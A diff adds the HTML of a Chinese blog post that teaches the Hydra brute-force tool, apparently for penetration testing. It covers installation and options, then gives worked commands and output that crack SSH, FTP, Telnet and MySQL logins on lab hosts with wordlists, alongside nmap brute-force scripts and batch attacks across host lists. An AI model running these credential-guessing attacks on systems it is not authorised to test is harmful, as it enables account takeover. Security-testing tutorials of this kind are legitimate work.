@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+<meta name="google-site-verification" content="mHoeZbiieuN238tsyMA7DAU6UTZSrTBkXmCT6RO_jAw" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_apple-touch-icon-wechat.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_favicon-32x32-wechat.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_favicon-16x16-wechat.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="mHoeZbiieuN238tsyMA7DAU6UTZSrTBkXmCT6RO_jAw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hiyongz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"giteement","storage":true,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Hydra是一款暴力破解工具，进行并行登录破解，破解远程服务的用户名密码，由黑客组织THC开发，它可以对超过50个协议进行快速字典攻击，包括telnet、ftp、http(s)、smb、MySQL、SMTP等。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hydra暴力破解工具">
+<meta property="og:url" content="https://hiyongz.github.io/posts/api-test-security-testing-hydra-tool/index.html">
+<meta property="og:site_name" content="HiYong">
+<meta property="og:description" content="Hydra是一款暴力破解工具，进行并行登录破解，破解远程服务的用户名密码，由黑客组织THC开发，它可以对超过50个协议进行快速字典攻击，包括telnet、ftp、http(s)、smb、MySQL、SMTP等。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-03-31T04:12:00.000Z">
+<meta property="article:modified_time" content="2021-04-03T08:34:26.992Z">
+<meta property="article:author" content="HiYo">
+<meta property="article:tag" content="暴力破解">
+<meta property="article:tag" content="hydra">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://hiyongz.github.io/posts/api-test-security-testing-hydra-tool/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>hydra暴力破解工具 | HiYong</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  <script src="/live2d-widget/autoload.js"></script>
+<link rel="alternate" href="/atom.xml" title="HiYong" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">HiYong</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">此时 此地 此身</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-books">
+
+    <a href="/books/" rel="section"><i class="fa fa-book fa-fw"></i>书单</a>
+
+  </li>
+        <li class="menu-item menu-item-tools">
+
+    <a href="/tools/" rel="section"><i class="fa fa-gavel fa-fw"></i>工具</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/hiyongz" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hiyongz.github.io/posts/api-test-security-testing-hydra-tool/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/logo_android-chrome-192x192-wechat.png">
+      <meta itemprop="name" content="HiYo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="HiYong">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hydra暴力破解工具
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-31 12:12:00" itemprop="dateCreated datePublished" datetime="2021-03-31T12:12:00+08:00">2021-03-31</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">自动化测试</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/posts/api-test-security-testing-hydra-tool/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/api-test-security-testing-hydra-tool/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Hydra是一款暴力破解工具，进行并行登录破解，破解远程服务的用户名密码，由黑客组织<a target="_blank" rel="noopener" href="https://www.thc.org/">THC</a>开发，它可以对超过50个协议进行快速字典攻击，包括telnet、ftp、http(s)、smb、MySQL、SMTP等。</p>
+<a id="more"></a>
+<h1 id="Hydra安装"><a href="#Hydra安装" class="headerlink" title="Hydra安装"></a>Hydra安装</h1><p>官方github地址：<a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a><br>Kali Linux中自带Hydra，下面介绍其它系统安装方法。</p>
+<h2 id="Ubuntu安装"><a href="#Ubuntu安装" class="headerlink" title="Ubuntu安装"></a>Ubuntu安装</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install hydra</span><br></pre></td></tr></table></figure>
+<h2 id="centos系统安装"><a href="#centos系统安装" class="headerlink" title="centos系统安装"></a>centos系统安装</h2><p><strong>1、下载</strong><br>地址：<a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra/releases/tag/v9.2">https://github.com/vanhauser-thc/thc-hydra/releases/tag/v9.2</a></p>
+<p><strong>2、安装依赖</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yum install openssl-devel pcre-devel ncpfs-devel postgresql-devel libssh-devel subversion-devel libncurses-devel</span><br></pre></td></tr></table></figure>
+<p><strong>3、编译安装</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ tar zxf thc-hydra-9.2.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> thc-hydra-9.2</span><br><span class="line">$ ./configure</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure>
+<p>查看帮助信息：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hydra -h</span><br><span class="line">Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -R        restore a previous aborted/crashed session</span><br><span class="line">..............</span><br></pre></td></tr></table></figure></p>
+<h2 id="windows安装"><a href="#windows安装" class="headerlink" title="windows安装"></a>windows安装</h2><p>GitHub地址：<a target="_blank" rel="noopener" href="https://github.com/maaaaz/thc-hydra-windows">https://github.com/maaaaz/thc-hydra-windows</a><br>下载发布版本，解压就可以使用了</p>
+<h1 id="Hydra参数说明"><a href="#Hydra参数说明" class="headerlink" title="Hydra参数说明"></a>Hydra参数说明</h1><div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-R</td>
+<td style="text-align:center">继续上一次破解</td>
+</tr>
+<tr>
+<td style="text-align:center">-I</td>
+<td style="text-align:center">忽略现有还原文件（不等待10秒）</td>
+</tr>
+<tr>
+<td style="text-align:center">-s PORT</td>
+<td style="text-align:center">指定默认端口</td>
+</tr>
+<tr>
+<td style="text-align:center">-l LOGIN</td>
+<td style="text-align:center">指定破解登录用户名</td>
+</tr>
+<tr>
+<td style="text-align:center">-L FILE</td>
+<td style="text-align:center">使用文件指定多个用户名</td>
+</tr>
+<tr>
+<td style="text-align:center">-p PASS</td>
+<td style="text-align:center">指定密码</td>
+</tr>
+<tr>
+<td style="text-align:center">-P FILE</td>
+<td style="text-align:center">指定密码字典</td>
+</tr>
+<tr>
+<td style="text-align:center">-x MIN:MAX:CHARSET</td>
+<td style="text-align:center">密码暴力生成</td>
+</tr>
+<tr>
+<td style="text-align:center">-y</td>
+<td style="text-align:center">禁止在暴力破解中使用符号</td>
+</tr>
+<tr>
+<td style="text-align:center">-r</td>
+<td style="text-align:center">对选项-x使用非随机方法</td>
+</tr>
+<tr>
+<td style="text-align:center">-e nsr</td>
+<td style="text-align:center">n：空密码试探，s：使用指定用户和密码试探。</td>
+</tr>
+<tr>
+<td style="text-align:center">-u</td>
+<td style="text-align:center">循环用户</td>
+</tr>
+<tr>
+<td style="text-align:center">-C FILE</td>
+<td style="text-align:center">冒号分隔用户名密码：”login:pass” 格式</td>
+</tr>
+<tr>
+<td style="text-align:center">-M FILE</td>
+<td style="text-align:center">要攻击的服务器列表，每行一个条目，’:’指定端口</td>
+</tr>
+<tr>
+<td style="text-align:center">-o FILE</td>
+<td style="text-align:center">将找到的登录/密码写入文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-b FORMAT</td>
+<td style="text-align:center">指定-o输出格式，默认text,可选json, jsonv1</td>
+</tr>
+<tr>
+<td style="text-align:center">-f / -F</td>
+<td style="text-align:center">找到用户名/密码后中止破解，-f:每个主机，-F：所有</td>
+</tr>
+<tr>
+<td style="text-align:center">-t TASKS</td>
+<td style="text-align:center">每个主机并行线程数，默认16</td>
+</tr>
+<tr>
+<td style="text-align:center">-T TASKS</td>
+<td style="text-align:center">所有并行线程数，默认64</td>
+</tr>
+<tr>
+<td style="text-align:center">-w / -W TIME</td>
+<td style="text-align:center">最大等待响应时间</td>
+</tr>
+<tr>
+<td style="text-align:center">-c TIME</td>
+<td style="text-align:center">所有进程每次尝试登录等待时间</td>
+</tr>
+<tr>
+<td style="text-align:center">-4 / -6</td>
+<td style="text-align:center">IPv4(默认)/IPv6地址</td>
+</tr>
+<tr>
+<td style="text-align:center">-v / -V / -d</td>
+<td style="text-align:center">详细日志模式/每次尝试仅显示用户名密码/调试模式</td>
+</tr>
+<tr>
+<td style="text-align:center">-k</td>
+<td style="text-align:center">不重做失败的尝试（适用于-M批量扫描）</td>
+</tr>
+<tr>
+<td style="text-align:center">-q</td>
+<td style="text-align:center">不要打印错误连接消息</td>
+</tr>
+<tr>
+<td style="text-align:center">-U</td>
+<td style="text-align:center">服务模块详细使用信息</td>
+</tr>
+<tr>
+<td style="text-align:center">server</td>
+<td style="text-align:center">目标服务名称或IP地址(也可以使用-M参数)</td>
+</tr>
+<tr>
+<td style="text-align:center">service</td>
+<td style="text-align:center">要破解的服务</td>
+</tr>
+<tr>
+<td style="text-align:center">OPT</td>
+<td style="text-align:center">可选项</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>支持的服务包括：adam6500, asterisk, cisco, cisco-enable, cvs, ftp, http-{head|get|post}, http-{get|post}-form, http-proxy, http-proxy-urlenum, icq, imap, irc, ldap2, ldap3[s], mssql, mysql(v4), nntp, pcanywhere, pcnfs, pop3, redis, rexec, rlogin, rpcap, rsh, rtsp, s7-300, smb, smtp, smtp-enum, snmp, socks5, teamspeak, telnet, vmauthd, vnc, xmpp</p>
+<h1 id="Hydra使用实例"><a href="#Hydra使用实例" class="headerlink" title="Hydra使用实例"></a>Hydra使用实例</h1><p>手动创建用户名字典和密码字典<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cat user.txt </span><br><span class="line">admin</span><br><span class="line">root</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">zhy</span><br><span class="line">haha</span><br><span class="line">$ cat pwd.txt </span><br><span class="line">admin</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">123456</span><br><span class="line">666666</span><br><span class="line">zhy</span><br><span class="line">12345678</span><br><span class="line">$ </span><br></pre></td></tr></table></figure></p>
+<h2 id="破解ssh"><a href="#破解ssh" class="headerlink" title="破解ssh"></a>破解ssh</h2><p>使用单个用户名密码<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ hydra 192.168.20.9 ssh -l root -p 12345678</span><br><span class="line">ydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-21 23:41:45</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task</span><br><span class="line">[DATA] attacking ssh://192.168.20.9:22/</span><br><span class="line">[22][ssh] host: 192.168.20.9   login: root   password: 12345678</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-21 23:41:46</span><br></pre></td></tr></table></figure><br>上面的结果提示推荐使用<code>-t 4</code>，默认并发数为16</p>
+<p>使用密码字典<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ hydra 192.168.20.9 ssh -L user.txt -P pwd.txt -t 4 -e ns</span><br><span class="line">hydra ssh://192.168.20.9 -L user.txt -P pwd.txt -t 4 -e ns -f</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-21 23:50:05</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 40 login tries (l:5/p:8), ~10 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.20.9:22/</span><br><span class="line">[22][ssh] host: 192.168.20.9   login: root   password: 12345678</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 1 final worker threads did not complete until end.</span><br><span class="line">[ERROR] 0 targets did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-21 23:50:23</span><br></pre></td></tr></table></figure><br><code>-e ns</code>参数：尝试空密码</p>
+<h2 id="破解ftp-telnet"><a href="#破解ftp-telnet" class="headerlink" title="破解ftp/telnet"></a>破解ftp/telnet</h2><p>与ssh类似<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hydra 192.168.20.9 ftp -L user.txt -P pwd.txt -t 4</span><br><span class="line">$ hydra 192.168.20.9 telnet -L user.txt -P pwd.txt -t 4</span><br></pre></td></tr></table></figure></p>
+<h2 id="破解MySQL数据库"><a href="#破解MySQL数据库" class="headerlink" title="破解MySQL数据库"></a>破解MySQL数据库</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ hydra -L user.txt -P pwd.txt -t 4 127.0.0.1 mysql</span><br><span class="line">$ hydra -L user.txt -P pwd.txt -t 4 mysql://127.0.0.1:3306</span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-22 15:55:50</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 30 login tries (l:5/p:6), ~8 tries per task</span><br><span class="line">[DATA] attacking mysql://127.0.0.1:3306/</span><br><span class="line">[3306][mysql] host: 127.0.0.1   login: admin   password: admin</span><br><span class="line">[3306][mysql] host: 127.0.0.1   login: root   password: 123456</span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-22 15:55:51</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>ssh、ftp、telnet和mysql协议也可以使用nmap工具破解：<br>nmap暴力破解脚本：<a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/categories/brute.html">https://nmap.org/nsedoc/categories/brute.html</a><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nmap --script ftp-brute -p 21 &lt;host&gt;</span><br><span class="line">$ nmap --script ssh-brute -p 22 &lt;host&gt;</span><br><span class="line">$ nmap --script mysql-brute -p 3306 &lt;host&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="批量破解多个主机：-M参数"><a href="#批量破解多个主机：-M参数" class="headerlink" title="批量破解多个主机：-M参数"></a>批量破解多个主机：<code>-M</code>参数</h2><p>创建主机字典：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cat host.txt</span><br><span class="line">192.168.20.8</span><br><span class="line">192.168.20.9</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ hydra -L user.txt -P pwd.txt -t 4 -M host.txt -f ssh</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-21 23:59:03</span><br><span class="line">[DATA] max 4 tasks per 2 servers, overall 8 tasks, 30 login tries (l:5/p:6), ~8 tries per task</span><br><span class="line">[DATA] attacking ssh://(2 targets):22/</span><br><span class="line">[22][ssh] host: 192.168.20.9   login: root   password: 12345678</span><br><span class="line">[22][ssh] host: 192.168.20.8   login: root   password: 12345678</span><br><span class="line">2 of 2 targets successfully completed, 2 valid passwords found</span><br><span class="line">[WARNING] Writing restore file because 4 final worker threads did not complete until end.</span><br><span class="line">[ERROR] 4 targets did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 targets did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-21 23:59:17</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>将破解日志保存到文件中：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hydra -L user.txt -P pwd.txt -t 4 -vV -M host.txt -o results.log ssh</span><br></pre></td></tr></table></figure></p>
+<center><b>--THE END--<b></center>
+
+
+
+    
+    
+    
+      <br/>
+      <div>
+          
+              
+<div class="my-post-copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+
+  <p><span>本文标题:</span>hydra暴力破解工具</a></p>
+  <p><span>文章作者:</span>hiyo</a></p>
+  <p><span>文章链接:</span><a href="/posts/api-test-security-testing-hydra-tool/" title="hydra暴力破解工具">https://hiyongz.github.io/posts/api-test-security-testing-hydra-tool/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://hiyongz.github.io/posts/api-test-security-testing-hydra-tool/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span>本博客文章除特别声明外，均采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a> 许可协议。转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({   
+          title: "",   
+          text: '复制成功',   
+          html: false,
+          timer: 500,   
+          showConfirmButton: false
+        });
+      });
+    }));  
+</script>
+
+          
+      </div>
+      </div>
+      <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+        <img id="wechat_subscriber_qcode" src="/uploads/wechat.jpg" style="width: 200px; max-width: 100%;">
+        <div>关注微信公众号，及时接收最新技术文章！</div>
+      </div>
